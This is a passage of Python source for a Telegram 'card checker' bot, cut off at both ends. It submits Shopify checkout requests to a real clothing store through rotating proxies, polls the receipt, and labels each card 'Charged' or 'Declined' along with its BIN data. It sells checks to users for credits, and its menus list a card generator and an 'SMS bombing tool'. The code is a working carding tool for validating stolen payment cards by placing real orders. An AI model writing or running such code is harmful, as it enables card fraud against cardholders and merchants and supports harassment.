                        'countryCode': 'US',
                    },
                    'email': remail,
                    'emailChanged': False,
                    'phoneCountryCode': 'US',
                    'marketingConsent': [
                        {
                            'email': {
                                'value': remail,
                            },
                        },
                    ],
                    'shopPayOptInPhone': {
                        'countryCode': 'US',
                    },
                    'rememberMe': False,
                },
                'tip': {
                    'tipLines': [],
                },
                'taxes': {
                    'proposedAllocations': None,
                    'proposedTotalAmount': {
                        'value': {
                            'amount': '0',
                            'currencyCode': 'USD',
                        },
                    },
                    'proposedTotalIncludedAmount': None,
                    'proposedMixedStateTotalAmount': None,
                    'proposedExemptions': [],
                },
                'note': {
                    'message': None,
                    'customAttributes': [
                        {
                            'key': '_source',
                            'value': 'Rebuy',
                        },
                        {
                            'key': '_attribution',
                            'value': 'Smart Cart 2.0',
                        },
                    ],
                },
                'localizationExtension': {
                    'fields': [],
                },
                'nonNegotiableTerms': None,
                'scriptFingerprint': {
                    'signature': None,
                    'signatureUuid': None,
                    'lineItemScriptChanges': [],
                    'paymentScriptChanges': [],
                    'shippingScriptChanges': [],
                },
                'optionalDuties': {
                    'buyerRefusesDuties': False,
                },
                'cartMetafields': [],
            },
            'attemptToken': f'{tok}',
            'metafields': [],
            'analytics': {
                'requestUrl': f'https://violettefieldthreads.com/checkouts/cn/{tok}/en-us?auto_redirect=false&edge_redirect=true&skip_shop_pay=true',
            },
        },
        'operationName': 'SubmitForCompletion',
    }

    response = session.post('https://violettefieldthreads.com/checkouts/unstable/graphql',
        params=params,
        headers=headers,
        json=json_data,
        proxies=proxy if proxy else None
    )
    #------------×Submitt_For_Checkout×-----------#
    
    
    #-----------×Response_For_Debug×-------------#
    raw = response.text
    print(f"Submit Response: {raw[:500]}...")  # Debug log
    try:
        res_json = json.loads(raw)
        submit_data = res_json['data']['submitForCompletion']
        if 'receipt' in submit_data or submit_data.get('__typename') in ['SubmitSuccess', 'SubmitAlreadyAccepted', 'SubmittedForCompletion']:
            rid = submit_data['receipt']['id'] if 'receipt' in submit_data else submit_data.get('receipt', {}).get('id')
            print(f"Receipt ID: {rid}")
        elif 'buyerProposal' in submit_data or submit_data.get('__typename') == 'SubmitRejected':
            print("Submit returned buyerProposal - rejected.")
            errors = submit_data.get('errors', [])
            if errors:
                for e in errors:
                    code = e.get('code', 'Unknown')
                    msg = e.get('localizedMessage', 'No message')
                    print(f"Error Code: {code}, Message: {msg}")
                    if 'avs' in code.lower() or 'address' in msg.lower():
                        return "Declined: AVS/Address Mismatch"
                    elif 'fraud' in code.lower() or 'risk' in code.lower():
                        return "Declined: Fraud/Risk Detected"
                    elif 'price' in msg.lower() or 'total' in msg.lower():
                        return "Declined: Price Mismatch"
                    else:
                        return f"Declined: {code} - {msg}"
            else:
                return "Declined: Rejected (negotiation required or fraud detected)"
        else:
            # Check for other cases like Throttled
            if 'Throttled' in str(submit_data):
                return "Throttled: Rate limited"
            errors = res_json.get('errors', [])
            if errors:
                return f"GraphQL Error: {errors[0].get('message', 'Unknown')}"
            return "Failed at step 5: Unexpected response structure."
            
    except (json.JSONDecodeError, KeyError, TypeError) as e:
        print(f"Parse error: {e}")
        print(f"Raw response: {raw[:300]}")
        return f"Failed at step 5: Could not parse response. Error: {e}"
    #-----------×Response_For_Debug×-------------#
    random_delay(0.2, 0.5)

    
    #------------×Polling_receipt×-------------#
    print("Step 6: Polling for receipt...")
    headers = {
        'authority': 'violettefieldthreads.com',
        'accept': 'application/json',
        'accept-language': 'en-US',
        'content-type': 'application/json',
        'origin': 'https://violettefieldthreads.com',
        'referer': 'https://violettefieldthreads.com/',
        'sec-fetch-site': 'same-origin',
        'shopify-checkout-client': 'checkout-web/1.0',
        'user-agent': user_agent,
        'x-checkout-one-session-token': x,
        'x-checkout-web-deploy-stage': 'production',
        'x-checkout-web-server-handling': 'fast',
        'x-checkout-web-server-rendering': 'yes',
    }
    params = {
        'operationName': 'PollForReceipt',
    }
    json_data = {
        'query': 'query PollForReceipt($receiptId:ID!,$sessionToken:String!){receipt(receiptId:$receiptId,sessionInput:{sessionToken:$sessionToken}){...ReceiptDetails __typename}}fragment ReceiptDetails on Receipt{...on ProcessedReceipt{id token redirectUrl confirmationPage{url shouldRedirect __typename}orderStatusPageUrl shopPay shopPayInstallments paymentExtensionBrand analytics{checkoutCompletedEventId emitConversionEvent __typename}poNumber orderIdentity{buyerIdentifier id __typename}customerId isFirstOrder eligibleForMarketingOptIn purchaseOrder{...ReceiptPurchaseOrder __typename}orderCreationStatus{__typename}paymentDetails{paymentCardBrand creditCardLastFourDigits paymentAmount{amount currencyCode __typename}paymentGateway financialPendingReason paymentDescriptor buyerActionInfo{...on MultibancoBuyerActionInfo{entity reference __typename}__typename}paymentIcon __typename}shopAppLinksAndResources{mobileUrl qrCodeUrl canTrackOrderUpdates shopInstallmentsViewSchedules shopInstallmentsMobileUrl installmentsHighlightEligible mobileUrlAttributionPayload shopAppEligible shopAppQrCodeKillswitch shopPayOrder payEscrowMayExist buyerHasShopApp buyerHasShopPay orderUpdateOptions __typename}postPurchasePageUrl postPurchasePageRequested postPurchaseVaultedPaymentMethodStatus paymentFlexibilityPaymentTermsTemplate{__typename dueDate dueInDays id translatedName type}finalizedRemoteCheckouts{...FinalizedRemoteCheckoutsResult __typename}__typename}...on ProcessingReceipt{id purchaseOrder{...ReceiptPurchaseOrder __typename}pollDelay __typename}...on WaitingReceipt{id pollDelay __typename}...on ProcessingRemoteCheckoutsReceipt{id pollDelay remoteCheckouts{...on SubmittingRemoteCheckout{shopId __typename}...on SubmittedRemoteCheckout{shopId __typename}__typename}__typename}...on ActionRequiredReceipt{id action{...on CompletePaymentChallenge{offsiteRedirect url __typename}...on CompletePaymentChallengeV2{challengeType challengeData __typename}__typename}timeout{millisecondsRemaining __typename}__typename}...on FailedReceipt{id processingError{...on InventoryClaimFailure{__typename}...on InventoryReservationFailure{__typename}...on OrderCreationFailure{paymentsHaveBeenReverted __typename}...on OrderCreationSchedulingFailure{__typename}...on PaymentFailed{code messageUntranslated hasOffsitePaymentMethod __typename}...on DiscountUsageLimitExceededFailure{__typename}...on CustomerPersistenceFailure{__typename}__typename}__typename}__typename}fragment ReceiptPurchaseOrder on PurchaseOrder{__typename sessionToken totalAmountToPay{amount currencyCode __typename}checkoutCompletionTarget delivery{...on PurchaseOrderDeliveryTerms{splitShippingToggle deliveryLines{__typename availableOn deliveryStrategy{handle title description methodType brandedPromise{handle logoUrl lightThemeLogoUrl darkThemeLogoUrl lightThemeCompactLogoUrl darkThemeCompactLogoUrl name __typename}pickupLocation{...on PickupInStoreLocation{name address{address1 address2 city countryCode zoneCode postalCode phone coordinates{latitude longitude __typename}__typename}instructions __typename}...on PickupPointLocation{address{address1 address2 address3 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}__typename}carrierCode carrierName name carrierLogoUrl fromDeliveryOptionGenerator __typename}__typename}deliveryPromisePresentmentTitle{short long __typename}deliveryStrategyBreakdown{__typename amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}discountRecurringCycleLimit excludeFromDeliveryOptionPrice flatRateGroupId targetMerchandise{...on PurchaseOrderMerchandiseLine{stableId quantity{...on PurchaseOrderMerchandiseQuantityByItem{items __typename}__typename}merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}legacyFee __typename}...on PurchaseOrderBundleLineComponent{stableId quantity merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}__typename}__typename}}__typename}lineAmount{amount currencyCode __typename}lineAmountAfterDiscounts{amount currencyCode __typename}destinationAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}__typename}groupType targetMerchandise{...on PurchaseOrderMerchandiseLine{stableId quantity{...on PurchaseOrderMerchandiseQuantityByItem{items __typename}__typename}merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}legacyFee __typename}...on PurchaseOrderBundleLineComponent{stableId quantity merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}__typename}__typename}}__typename}__typename}deliveryExpectations{__typename brandedPromise{name logoUrl handle lightThemeLogoUrl darkThemeLogoUrl __typename}deliveryStrategyHandle deliveryExpectationPresentmentTitle{short long __typename}returnability{returnable __typename}}payment{...on PurchaseOrderPaymentTerms{billingAddress{__typename...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}}paymentLines{amount{amount currencyCode __typename}postPaymentMessage dueAt due{...on PaymentLineDueEvent{event __typename}...on PaymentLineDueTime{time __typename}__typename}paymentMethod{...on DirectPaymentMethod{sessionId paymentMethodIdentifier vaultingAgreement creditCard{brand lastDigits __typename}billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on CustomerCreditCardPaymentMethod{id brand displayLastDigits token deletable defaultPaymentMethod requiresCvvConfirmation firstDigits billingAddress{...on StreetAddress{address1 address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}__typename}...on PurchaseOrderGiftCardPaymentMethod{balance{amount currencyCode __typename}code __typename}...on WalletPaymentMethod{name walletContent{...on ShopPayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}sessionToken paymentMethodIdentifier paymentMethod paymentAttributes __typename}...on PaypalWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}email payerId token expiresAt __typename}...on ApplePayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}data signature version __typename}...on GooglePayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}signature signedMessage protocolVersion __typename}...on ShopifyInstallmentsWalletContent{autoPayEnabled billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}disclosureDetails{evidence id type __typename}installmentsToken sessionToken creditCard{brand lastDigits __typename}__typename}__typename}__typename}...on WalletsPlatformPaymentMethod{name walletParams __typename}...on LocalPaymentMethod{paymentMethodIdentifier name displayName billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on PaymentOnDeliveryMethod{additionalDetails paymentInstructions paymentMethodIdentifier billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on OffsitePaymentMethod{paymentMethodIdentifier name billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on ManualPaymentMethod{additionalDetails name paymentInstructions id paymentMethodIdentifier billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on CustomPaymentMethod{additionalDetails name paymentInstructions id paymentMethodIdentifier billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on DeferredPaymentMethod{orderingIndex displayName __typename}...on PaypalBillingAgreementPaymentMethod{token billingAddress{...on StreetAddress{address1 address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}__typename}...on RedeemablePaymentMethod{redemptionSource redemptionContent{...on ShopCashRedemptionContent{redemptionPaymentOptionKind billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}__typename}redemptionId details{redemptionId sourceAmount{amount currencyCode __typename}destinationAmount{amount currencyCode __typename}redemptionType __typename}__typename}...on CustomRedemptionContent{redemptionAttributes{key value __typename}maskedIdentifier paymentMethodIdentifier __typename}...on StoreCreditRedemptionContent{storeCreditAccountId __typename}__typename}__typename}...on CustomOnsitePaymentMethod{paymentMethodIdentifier name __typename}__typename}__typename}__typename}__typename}buyerIdentity{...on PurchaseOrderBuyerIdentityTerms{contactMethod{...on PurchaseOrderEmailContactMethod{email __typename}...on PurchaseOrderSMSContactMethod{phoneNumber __typename}__typename}marketingConsent{...on PurchaseOrderEmailContactMethod{email __typename}...on PurchaseOrderSMSContactMethod{phoneNumber __typename}__typename}__typename}customer{__typename...on GuestProfile{presentmentCurrency countryCode market{id handle __typename}__typename}...on DecodedCustomerProfile{id presentmentCurrency fullName firstName lastName countryCode email imageUrl acceptsSmsMarketing acceptsEmailMarketing ordersCount phone __typename}...on BusinessCustomerProfile{checkoutExperienceConfiguration{editableShippingAddress __typename}id presentmentCurrency fullName firstName lastName acceptsSmsMarketing acceptsEmailMarketing countryCode imageUrl email ordersCount phone market{id handle __typename}__typename}}purchasingCompany{company{id externalId name __typename}contact{locationCount __typename}location{id externalId name __typename}__typename}__typename}merchandise{taxesIncluded merchandiseLines{stableId legacyFee merchandise{...ProductVariantSnapshotMerchandiseDetails __typename}lineAllocations{checkoutPriceAfterDiscounts{amount currencyCode __typename}checkoutPriceAfterLineDiscounts{amount currencyCode __typename}checkoutPriceBeforeReductions{amount currencyCode __typename}quantity stableId totalAmountAfterDiscounts{amount currencyCode __typename}totalAmountAfterLineDiscounts{amount currencyCode __typename}totalAmountBeforeReductions{amount currencyCode __typename}discountAllocations{__typename amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}}unitPrice{measurement{referenceUnit referenceValue __typename}price{amount currencyCode __typename}__typename}__typename}lineComponents{...PurchaseOrderBundleLineComponent __typename}quantity{__typename...on PurchaseOrderMerchandiseQuantityByItem{items __typename}}recurringTotal{fixedPrice{__typename amount currencyCode}fixedPriceCount interval intervalCount recurringPrice{__typename amount currencyCode}title __typename}lineAmount{__typename amount currencyCode}parentRelationship{parent{stableId lineAllocations{stableId __typename}__typename}__typename}__typename}__typename}tax{totalTaxAmountV2{__typename amount currencyCode}totalDutyAmount{amount currencyCode __typename}totalTaxAndDutyAmount{amount currencyCode __typename}totalAmountIncludedInTarget{amount currencyCode __typename}__typename}discounts{lines{...PurchaseOrderDiscountLineFragment __typename}__typename}legacyRepresentProductsAsFees totalSavings{amount currencyCode __typename}subtotalBeforeTaxesAndShipping{amount currencyCode __typename}legacySubtotalBeforeTaxesShippingAndFees{amount currencyCode __typename}legacyAggregatedMerchandiseTermsAsFees{title description total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}landedCostDetails{incotermInformation{incoterm reason __typename}__typename}optionalDuties{buyerRefusesDuties refuseDutiesPermitted __typename}dutiesIncluded tip{tipLines{amount{amount currencyCode __typename}__typename}__typename}hasOnlyDeferredShipping note{customAttributes{key value __typename}message __typename}shopPayArtifact{optIn{vaultPhone __typename}__typename}recurringTotals{fixedPrice{amount currencyCode __typename}fixedPriceCount interval intervalCount recurringPrice{amount currencyCode __typename}title __typename}checkoutTotalBeforeTaxesAndShipping{__typename amount currencyCode}checkoutTotal{__typename amount currencyCode}checkoutTotalTaxes{__typename amount currencyCode}subtotalBeforeReductions{__typename amount currencyCode}subtotalAfterMerchandiseDiscounts{__typename amount currencyCode}deferredTotal{amount{__typename...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}}dueAt subtotalAmount{__typename...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}}taxes{__typename...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}}__typename}metafields{key namespace value valueType:type __typename}}fragment ProductVariantSnapshotMerchandiseDetails on ProductVariantSnapshot{variantId options{name value __typename}productTitle title productUrl untranslatedTitle untranslatedSubtitle sellingPlan{name id digest deliveriesPerBillingCycle prepaid subscriptionDetails{billingInterval billingIntervalCount billingMaxCycles deliveryInterval deliveryIntervalCount __typename}__typename}deferredAmount{amount currencyCode __typename}digest giftCard image{altText url one:url(transform:{maxWidth:64,maxHeight:64})two:url(transform:{maxWidth:128,maxHeight:128})four:url(transform:{maxWidth:256,maxHeight:256})__typename}price{amount currencyCode __typename}productId productType properties{...MerchandiseProperties __typename}requiresShipping sku taxCode taxable vendor weight{unit value __typename}__typename}fragment MerchandiseProperties on MerchandiseProperty{name value{...on MerchandisePropertyValueString{string:value __typename}...on MerchandisePropertyValueInt{int:value __typename}...on MerchandisePropertyValueFloat{float:value __typename}...on MerchandisePropertyValueBoolean{boolean:value __typename}...on MerchandisePropertyValueJson{json:value __typename}__typename}visible __typename}fragment DiscountDetailsFragment on Discount{...on CustomDiscount{title description presentationLevel allocationMethod targetSelection targetType signature signatureUuid type value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}...on CodeDiscount{title code presentationLevel allocationMethod message targetSelection targetType value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}...on DiscountCodeTrigger{code __typename}...on AutomaticDiscount{presentationLevel title allocationMethod message targetSelection targetType value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}__typename}fragment PurchaseOrderBundleLineComponent on PurchaseOrderBundleLineComponent{stableId merchandise{...ProductVariantSnapshotMerchandiseDetails __typename}lineAllocations{checkoutPriceAfterDiscounts{amount currencyCode __typename}checkoutPriceAfterLineDiscounts{amount currencyCode __typename}checkoutPriceBeforeReductions{amount currencyCode __typename}quantity stableId totalAmountAfterDiscounts{amount currencyCode __typename}totalAmountAfterLineDiscounts{amount currencyCode __typename}totalAmountBeforeReductions{amount currencyCode __typename}discountAllocations{__typename amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index}unitPrice{measurement{referenceUnit referenceValue __typename}price{amount currencyCode __typename}__typename}__typename}quantity recurringTotal{fixedPrice{__typename amount currencyCode}fixedPriceCount interval intervalCount recurringPrice{__typename amount currencyCode}title __typename}totalAmount{__typename amount currencyCode}__typename}fragment PurchaseOrderDiscountLineFragment on PurchaseOrderDiscountLine{discount{...DiscountDetailsFragment __typename}lineAmount{amount currencyCode __typename}deliveryAllocations{amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index stableId targetType __typename}merchandiseAllocations{amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index stableId targetType __typename}__typename}fragment FinalizedRemoteCheckoutsResult on FinalizedRemoteCheckout{shopId result{...on ProcessedRemoteReceipt{orderIdentity{buyerIdentifier id __typename}orderStatusPageUrl remotePurchaseOrder{merchandise{merchandiseLines{stableId quantity{...on PurchaseOrderMerchandiseQuantityByItem{items __typename}__typename}merchandise{...on ProductVariantSnapshot{productId title productTitle image{altText url(transform:{maxWidth:64,maxHeight:64})__typename}price{amount currencyCode __typename}__typename}__typename}__typename}__typename}checkoutTotal{amount currencyCode __typename}subtotalBeforeTaxesAndShipping{amount currencyCode __typename}tax{totalTaxAmountV2{amount currencyCode __typename}__typename}payment{paymentLines{amount{amount currencyCode __typename}__typename}__typename}delivery{deliveryLines{deliveryStrategy{handle title __typename}lineAmount{amount currencyCode __typename}__typename}__typename}__typename}__typename}...on FailedRemoteReceipt{recoveryUrl remotePurchaseOrder{merchandise{merchandiseLines{stableId quantity{...on PurchaseOrderMerchandiseQuantityByItem{items __typename}__typename}merchandise{...on ProductVariantSnapshot{productId title productTitle image{altText url(transform:{maxWidth:64,maxHeight:64})__typename}price{amount currencyCode __typename}__typename}__typename}__typename}__typename}checkoutTotal{amount currencyCode __typename}subtotalBeforeTaxesAndShipping{amount currencyCode __typename}tax{totalTaxAmountV2{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}',
        'variables': {
            'receiptId': rid,
            'sessionToken': x,
        },
        'operationName': 'PollForReceipt',
    }
    
    
    status = "Declined!❌"
    resp_msg = "Processing Failed!"
    
    max_retries = 5
    order_details = {}
    
    for attempt in range(max_retries):
        random_delay(0.3, 0.6)  # Minimal delay between polls
        final_response = session.post('https://violettefieldthreads.com/checkouts/unstable/graphql', 
                                      params=params, 
                                      headers=headers, 
                                      json=json_data, 
                                      proxies=proxy if proxy else None)
        final_text = final_response.text
        #------------×Polling_receipt×-------------#
        
        
        #-----------×Response_For_Ui_to_Send×-------------#
        print(f"\n=== Poll Attempt {attempt + 1} DEBUG ===")
        print(f"Status Code: {final_response.status_code}")
        print(f"Response Length: {len(final_text)} chars")
        print(f"Response Snippet: {final_text[:300]}...")
        
        if "thank" in final_text.lower() or '"__typename":"ProcessedReceipt"' in final_text:
            status = "Charged🔥"
            resp_msg = "ORDER_PLACED"
            
            print(f"\n🔥 ORDER SUCCESSFUL! 🔥")
            print(f"Full Response: {final_text[:1000]}...")
            
            try:
                response_json = json.loads(final_text)
                receipt_data = response_json.get('data', {}).get('receipt', {})
                
                order_id = receipt_data.get('id', 'N/A')
                redirect_url = receipt_data.get('redirectUrl', 'N/A')
                confirmation_url = receipt_data.get('confirmationPage', {}).get('url', 'N/A')
                order_status_url = receipt_data.get('orderStatusPageUrl', 'N/A')
                
                order_details = {
                    'order_id': order_id,
                    'redirect_url': redirect_url,
                    'confirmation_url': confirmation_url,
                    'order_status_url': order_status_url
                }
                
                print(f"Order ID: {order_id}")
                print(f"Redirect URL: {redirect_url}")
                print(f"Confirmation URL: {confirmation_url}")
                print(f"Order Status URL: {order_status_url}")
                
            except Exception as e:
                print(f"Error parsing order details: {e}")
            break
        elif "actionrequiredreceipt" in final_text.lower():
            status = "Declined!❌"
            resp_msg = "3D_SECURE_REQUIRED"
            print(f"\n❌ 3D Secure Required")
            print(f"Response: {final_text[:500]}...")
            break
        elif "processingreceipt" in final_text.lower() or "waitingreceipt" in final_text.lower():
            print("⏳ Still processing...")
            time.sleep(0.5)  #------×Small_wait×-------#
            continue
        else:
            #-----------×Extracting_error_code×----------#
            error_code = find_between(final_text, '"code":"', '"').lower()
            print(f"\n❌ Payment Failed")
            print(f"Error Code: {error_code}")
            print(f"Response: {final_text[:500]}...")
            
            if "fraud" in error_code or "buyerproposal" in final_text.lower():
                resp_msg = "FRAUD_SUSPECTED"
            elif "insufficient_funds" in error_code:
                resp_msg = "INSUFFICIENT_FUNDS"
            else:
                resp_msg = "CARD_DECLINED"
            break
            
    elapsed_time = time.time() - start_time
    print(f"\n=== CHECK COMPLETED ===")
    print(f"Time: {elapsed_time:.2f}s")
    print(f"Status: {resp_msg}")
    print(f"========================\n")
    #-----------×Response_For_Ui_to_Send×-------------#
    
    
    #------------×Bin_info×------------#
    bin_number = n[:6]
    bin_info = get_bin_info(bin_number)
    
    result = {
        'full_card': full_card, 
        'status': status, 
        'resp_msg': resp_msg,
        'username': username, 
        'dev': '𝙏𝙀𝘾𝙃𝙓𝙃𝙐𝘽',
        'dev_emoji': '☃',
        'order_details': order_details,
        'elapsed_time': f"{elapsed_time:.2f}s",
        'bin': bin_number,
        'bin_info': bin_info
    }
    return result
    #------------×Bin_info×------------#

    
#--------------COMMAND×HANDLERZ-BOT---------------#


#-----------×Start_command_Boring_bc×-----------#
# Converted handlers for python-telegram-bot (async)
import asyncio
import time
import logging
import re
import os
import requests  # kept (your test_proxy used requests) - blocking calls run in thread

from telegram import Update
from telegram.ext import (
    ApplicationBuilder,
    CommandHandler,
    MessageHandler,
    ContextTypes,
    filters,
)

# ---------NOTEE----------#
# This code assumes these globals and helper functions are already defined elsewhere
# in your file exactly as before (do not rename):
# CHECKED, TOTAL, CHARGED, DECLINED, ERROR, DEAD, STOP_CHECKING, LOCK,
# PROXIES, proxy_list, ANIMATION_FRAMES, OWNER_ID, TOKEN, logger, etc.
# Also assumes helper functions: add_user, get_user_credits, deduct_credit, sh,
# random_delay, get_random_proxy, test_proxy (we wrap blocking calls), load_data,
# redeem_gift_code, generate_gift_code, add_credits, get_user_credits, etc.
# ---------------------------


logger = logging.getLogger(__name__)
logging.basicConfig(level=logging.INFO)


# ---------------- START / HELP ----------------
import asyncio
import time
import logging
import re
import os
import requests

from telegram import Update
from telegram.ext import (
    ApplicationBuilder,
    CommandHandler,
    MessageHandler,
    ContextTypes,
    filters,
)

# --- Assumes these globals and helper functions exist exactly as you defined:
# CHECKED, TOTAL, CHARGED, DECLINED, ERROR, DEAD, STOP_CHECKING, LOCK,
# PROXIES, proxy_list, ANIMATION_FRAMES, OWNER_ID, TOKEN, logger,
# add_user, get_user_credits, deduct_credit, sh, random_delay, get_random_proxy,
# test_proxy (or test_proxy_blocking), load_data, redeem_gift_code,
# generate_gift_code, add_credits, etc.


def test_proxy_blocking(proxy_dict):
    try:
        test_url = "https://violettefieldthreads.com"
        start_time = time.time()
        response = requests.get(test_url, proxies=proxy_dict, timeout=10)
        elapsed_ms = int((time.time() - start_time) * 1000)
        if response.status_code == 200:
            return True, elapsed_ms
        else:
            return False, 0
    except Exception:
        return False, 0
        
        
logger = logging.getLogger(__name__)
logging.basicConfig(level=logging.INFO)
test_proxy = test_proxy_blocking
# ---------- Helper to get message, user info ----------
def get_msg_user_info(update: Update):
    """
    Returns tuple: (msg, user, user_id, username)
    """
    msg = update.effective_message
    user = update.effective_user
    user_id = getattr(user, "id", None) if user else None
    username = getattr(user, "username", None) if user else None
    if not username:
        username = "USER"
    return msg, user, user_id, username
    
    
    

# ---------------- START / HELP ----------------
async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    msg, user, user_id, username = get_msg_user_info(update)
    
    # Add/register user
    try:
        add_user(user_id, username)
    except Exception as e:
        logger.warning(f"add_user failed in start_command: {e}")

    credits = 0
    try:
        credits = get_user_credits(user_id)
    except Exception as e:
        logger.warning(f"get_user_credits failed in start_command: {e}")

    # Enhanced start message with animations
    start_text = f"""
╔═══════════════════════╗
    🌟 **TECHXHUB CHECKER** 🌟
╚═══════════════════════╝

👤 **User:** {username or 'Anonymous'}
💰 **Credits:** `{credits}`
🆔 **User ID:** `{user_id}`

━━━━━━━━━━━━━━━━━━━━━━

🎯 **QUICK ACCESS MENU**
Select an option below to get started!

✨ **Multi-User Support:** Active
🚀 **Enhanced UI:** Enabled
⚡ **Real-time Updates:** On

━━━━━━━━━━━━━━━━━━━━━━

💡 **Tip:** Use the buttons below for easy navigation or type /help for all commands!
"""
    
    try:
        await context.bot.send_animation(
            chat_id=user_id,
            animation="https://media.giphy.com/media/26tn33aiTi1jkl6H6/giphy.gif",
            caption=start_text,
            parse_mode="HTML",
            reply_markup=create_main_menu_keyboard()
        )
    except Exception as e:
        logger.warning(f"Animation send failed: {e}")
        await msg.reply_text(start_text, parse_mode="HTML", reply_markup=create_main_menu_keyboard())

# ========== CALLBACK QUERY HANDLER FOR INLINE KEYBOARDS ==========
async def main_callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle all inline keyboard button callbacks"""
    query = update.callback_query
    await query.answer()
    
    user = query.from_user
    user_id = user.id
    username = user.username or "Anonymous"
    data = query.data
    
    try:
        # Main Menu Callbacks
        if data == "menu_main":
            credits = get_user_credits(user_id)
            text = f"""
╔═══════════════════════╗
    🌟 **MAIN MENU** 🌟
╚═══════════════════════╝

👤 **User:** {username}
💰 **Credits:** `{credits}`

Select an option below:
"""
            await query.edit_message_caption(
                caption=text,
                parse_mode="HTML",
                reply_markup=create_main_menu_keyboard()
            )
        
        elif data == "menu_checker":
            text = """
🎴 **CARD CHECKER MENU**
━━━━━━━━━━━━━━━━━━━━

Choose your checking method:

🔍 **Single Check:** Check one card at a time
📋 **Mass Check:** Check multiple cards from file
🎯 **Stripe/CKO:** Specific gateway checks

💡 **Note:** Each check costs 1 credit
"""
            await query.edit_message_caption(
                caption=text,
                parse_mode="HTML",
                reply_markup=create_checker_menu_keyboard()
            )
        
        elif data == "menu_credits":
            data_dict = load_data()
            user_id_str = str(user_id)
            if user_id_str in data_dict['users']:
                u = data_dict['users'][user_id_str]
                credits = u.get('credits', 0)
                total_checks = u.get('total_checks', 0)
                joined = u.get('joined_date', 'Unknown')
                text = f"""
💳 **YOUR ACCOUNT**
━━━━━━━━━━━━━━━━━━━━

👤 **Username:** {username}
🆔 **User ID:** `{user_id}`
💰 **Credits:** `{credits}`
📊 **Total Checks:** `{total_checks}`
📅 **Joined:** {joined}

━━━━━━━━━━━━━━━━━━━━

💡 Use /redeem to add more credits
🎁 Contact admin for gift codes
"""
            else:
                text = "❌ **Account not found!** Use /register first."
            
            await query.edit_message_caption(
                caption=text,
                parse_mode="HTML",
                reply_markup=create_back_button("menu_main")
            )
        
        elif data == "menu_tools":
            text = """
🛠️ **TOOLS MENU**
━━━━━━━━━━━━━━━━━━━━

Select a tool:

🎲 **Generate:** Create random cards
🔍 **BIN Lookup:** Check BIN info
✂️ **Split/Sort:** Format cards
🌐 **Proxy:** Manage proxies
💣 **Bomber:** SMS bombing tool
🔗 **Backlinks:** SEO tool
🖼️ **Magic:** Image tools
"""
            await query.edit_message_caption(
                caption=text,
                parse_mode="HTML",
                reply_markup=create_tools_menu_keyboard()
            )
        
        elif data == "menu_stats":
            text = """
📊 **STATISTICS MENU**
━━━━━━━━━━━━━━━━━━━━

View detailed statistics:

📈 **Personal Stats:** Your checking history
🏆 **Leaderboard:** Top users ranking
👥 **All Users:** Total users count
